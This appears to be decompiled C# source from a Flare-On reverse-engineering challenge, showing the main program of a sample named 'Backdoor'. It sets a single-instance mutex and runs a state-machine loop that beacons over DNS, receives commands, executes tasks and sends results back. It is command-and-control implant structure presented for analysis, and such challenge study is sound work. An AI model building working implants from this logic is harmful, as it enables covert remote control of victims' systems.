using System;
using System.Threading;

namespace FlareOn.Backdoor
{
	// Token: 0x0200001C RID: 28
	public class Program
	{
		// Token: 0x06000067 RID: 103 RVA: 0x000020E8 File Offset: 0x000090E8
		public Program()
		{
			new Thread(delegate()
			{
				Program.Main(Environment.GetCommandLineArgs());
			}).Start();
		}

		// Token: 0x06000068 RID: 104 RVA: 0x00003F0C File Offset: 0x0000AF0C
		public static void flared_38(string[] args)
		{
			DnsClass.initDomainsList();
			bool flag;
			using (new Mutex(true, "e94901cd-77d9-44ca-9e5a-125190bcf317", out flag))
			{
				bool flag2 = flag;
				if (flag2)
				{
					StateMachine stateMachine = new StateMachine();
					StateMachine._initTransitionsMap();
					Config.flare_07();
					for (;;)
					{
						try
						{
							Console.WriteLine("State: {0}", StateMachine.CurrentState);
							switch (StateMachine.CurrentState)
							{
							case MachineState.Begin:
								StateMachine.MoveNext(MachineCommand.Start);
								break;
							case MachineState.Sleep:
								StateMachine.MoveNext(Program._SleepAlive());
								break;
							case MachineState.Alive:
								StateMachine.MoveNext(DnsClass.Alive());
								break;
							case MachineState.Receive:
								StateMachine.MoveNext(DnsClass.Receive());
								break;
							case MachineState.Do:
								StateMachine.MoveNext(TaskClass.DoTask());
								break;
							case MachineState.Send:
								StateMachine.MoveNext(DnsClass.Send());
								break;
							case MachineState.SendAndReceive:
								StateMachine.MoveNext(DnsClass.SendAndReceive());
								break;
							case MachineState.SecondSleep:
								StateMachine.MoveNext(Program.SleepSecond());
								break;
							}
						}
						catch (Exception ex)
						{
							try
							{
							}
							catch
							{
							}
						}
						Thread.Sleep(1);
					}
				}
			}
		}

		// Token: 0x06000069 RID: 105 RVA: 0x00004038 File Offset: 0x0000B038
		public static void Main(string[] args)
		{
			try
			{
				try
				{
					Util.flare_74();
					Program.flared_38(args);
				}
				catch (InvalidProgramException e)
				{
					Util.flare_70(e, new object[]
					{
						args
					});
				}
			}
			catch
			{
			}
		}

		// Token: 0x0600006A RID: 106 RVA: 0x00004094 File Offset: 0x0000B094
		public static MachineCommand __SleepAlive()
		{
			Util.SetTimeouts(Enums.DelayType.dtSecondCheck);
			return MachineCommand.Start;
		}

		// Token: 0x0600006B RID: 107 RVA: 0x000040B0 File Offset: 0x0000B0B0
		public static MachineCommand _SleepAlive()
		{
			MachineCommand result;
			try
			{
				result = Program.__SleepAlive();
			}
			catch (InvalidProgramException e)
			{
				result = (MachineCommand)Util.flare_70(e, null);
			}
			return result;
		}

		public static MachineCommand __SleepSecond()
		{
			Util.MakeDelay(Enums.DelayType.dtSecondCheck);
			return MachineCommand.Start;
		}

		// Token: 0x0600006D RID: 109 RVA: 0x00004108 File Offset: 0x0000B108
		public static MachineCommand SleepSecond()
		{
			MachineCommand result;
			try
			{
				result = Program.__SleepSecond();
			}
			catch (InvalidProgramException e)
			{
				result = (MachineCommand)Util.flare_70(e, null);
			}
			return result;
		}
	}
}
